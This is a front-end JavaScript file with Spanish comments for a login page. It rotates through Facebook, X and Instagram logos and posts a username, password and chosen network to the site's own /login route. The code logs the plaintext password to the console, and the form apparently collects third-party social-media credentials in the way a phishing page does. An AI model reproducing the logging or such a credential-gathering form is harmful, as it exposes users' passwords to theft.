document.write("JavaScript Funcionando")
const socials = ['Facebook', 'X', 'instagram'];
let index = 0;

document.getElementById('prev').addEventListener('click', function() {
    event.preventDefault();
    index = (index - 1 + socials.length) % socials.length;
    console.log('Botón atrás presionado, indice en: ' + index);
    updateSocial();
});

document.getElementById('next').addEventListener('click', function() {
    event.preventDefault();
    index = (index + 1) % socials.length;
    console.log('Botón next presionado indice en: ' + index);
    updateSocial();
});

function updateSocial() {
    const logoImage = document.querySelector('#social-logo-container .social-logo-img');
    logoImage.style.opacity = 0;
    setTimeout(function(){
        logoImage.src = '/images/' + socials[index] + '.svg';
        logoImage.alt = socials[index];
        document.getElementById('socialNetwork').value = socials[index];
        console.log('Image source updated to: ' + logoImage.src);
        logoImage.style.opacity = 1;
    }, 500);
}

document.getElementById('continue').addEventListener('click', function() {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const socialNetwork = document.getElementById('socialNetwork').value;
    const errorMessage = document.getElementById('error-message');

    /*
    console.log(document.getElementById('username').value);
    console.log(document.getElementById('password').value)
    console.log(socials[index]);
    console.log("Funciona el berraco botón");

     */

    if (!username || !password || !socialNetwork) {
        alert('Todos los campos son obligatorios.');
        return;
    }

    console.log("Datos del formulario:")
    console.log(username);
    console.log(password);
    console.log(socialNetwork);

    fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            'username': username,
            'password': password,
            'socialNetwork': socialNetwork
        })

    })
        .then(response => {
            if (response.redirected) {
                window.location.href = response.url;
            } else if (response.status === 401) {
                errorMessage.textContent = 'Usuario o contraseña incorrectos';
                errorMessage.style.display = 'block';
            } else {
                errorMessage.textContent = 'Uh oh, ocurrió un error, llamen al ingeniero';
                errorMessage.style.display = 'block';
                console.log('Error en la respuesta del servidor llamen al ingeniero ', response.statusText);
            }
        })
        .catch(error => {
            errorMessage.textContent = 'Uh oh, ocurrió un error, llamen al ingeniero';
            errorMessage.style.display = 'block';
            console.error('Error:', error);
        });
});

    // window.location.replace('/pages/Home.html');






